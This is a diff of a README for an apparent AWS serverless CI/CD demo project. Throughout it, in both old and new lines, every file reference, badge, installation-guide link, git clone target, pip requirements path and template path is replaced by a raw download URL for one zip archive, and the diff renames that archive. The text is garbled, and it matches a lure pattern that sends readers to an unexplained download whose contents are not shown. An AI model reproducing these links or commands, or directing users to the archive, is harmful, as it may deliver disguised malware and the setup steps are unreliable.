@@ -2,9 +2,9 @@
 
 A complete CI/CD pipeline demonstrating DevOps best practices with AWS serverless technologies.
 
-![Architecture](https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip)
-![AWS](https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip%20Tier-green)
-![Python](https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip)
+![Architecture](https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip)
+![AWS](https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip%20Tier-green)
+![Python](https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip)
 
 ## 📋 Overview
 
@@ -34,20 +34,20 @@ GitHub Push → CodePipeline → CodeBuild → CloudFormation → Lambda + API G
 
 ```
 serverless-cicd-pipeline/
-├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip                       # This file
-├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip                   # SAM template (Lambda, API, DynamoDB)
-├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip                   # CodeBuild configuration
-├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip                  # SAM deployment settings
-├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip                        # Local testing environment
+├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip                       # This file
+├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip                   # SAM template (Lambda, API, DynamoDB)
+├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip                   # CodeBuild configuration
+├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip                  # SAM deployment settings
+├── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip                        # Local testing environment
 ├── .gitignore
 ├── src/
 │   ├── handlers/
-│   │   └── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip                  # Lambda function code
+│   │   └── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip                  # Lambda function code
 │   ├── tests/
-│   │   └── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip             # Unit tests
-│   └── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip            # Python dependencies
+│   │   └── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip             # Unit tests
+│   └── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip            # Python dependencies
 └── infrastructure/
-    └── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip      # CI/CD pipeline CloudFormation
+    └── https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip      # CI/CD pipeline CloudFormation
 ```
 
 ## 🚀 Getting Started
@@ -56,7 +56,7 @@ serverless-cicd-pipeline/
 
 1. **AWS Account** (Free Tier eligible)
 2. **AWS CLI** configured with credentials
-3. **SAM CLI** installed ([Installation Guide](https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip))
+3. **SAM CLI** installed ([Installation Guide](https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip))
 4. **Python 3.11+**
 5. **GitHub Account**
 
@@ -64,11 +64,11 @@ serverless-cicd-pipeline/
 
 ```bash
 # Clone the repository
-git clone https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip
+git clone https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip
 cd serverless-cicd-pipeline
 
 # Install dependencies
-pip install -r https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip
+pip install -r https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip
 pip install pytest boto3
 ```
 
@@ -89,7 +89,7 @@ sam validate --lint
 sam build
 
 # Start local API
-sam local start-api --env-vars https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip
+sam local start-api --env-vars https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip
 
 # Test endpoint (in another terminal)
 curl http://localhost:3000/health
@@ -110,7 +110,7 @@ sam deploy
 ```bash
 # Deploy pipeline infrastructure
 aws cloudformation deploy \
-  --template-file https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip \
+  --template-file https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip \
   --stack-name task-manager-pipeline \
   --capabilities CAPABILITY_NAMED_IAM \
   --parameter-overrides \
@@ -191,14 +191,14 @@ This project demonstrates:
 
 ### Add a New Environment
 
-1. Update `https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip` with new environment settings
-2. Update `https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip` to add new stage
+1. Update `https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip` with new environment settings
+2. Update `https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip` to add new stage
 3. Deploy with `--config-env your-env`
 
 ### Add More Lambda Functions
 
 1. Add handler in `src/handlers/`
-2. Add function definition in `https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/serverless-cicd-pipeline-v2.0.zip`
+2. Add function definition in `https://github.com/KushalPitaliya/serverless-cicd-pipeline/raw/refs/heads/main/infrastructure/pipeline-serverless-cicd-expellable.zip`
 3. Add tests in `src/tests/`
 
 ## 📝 License
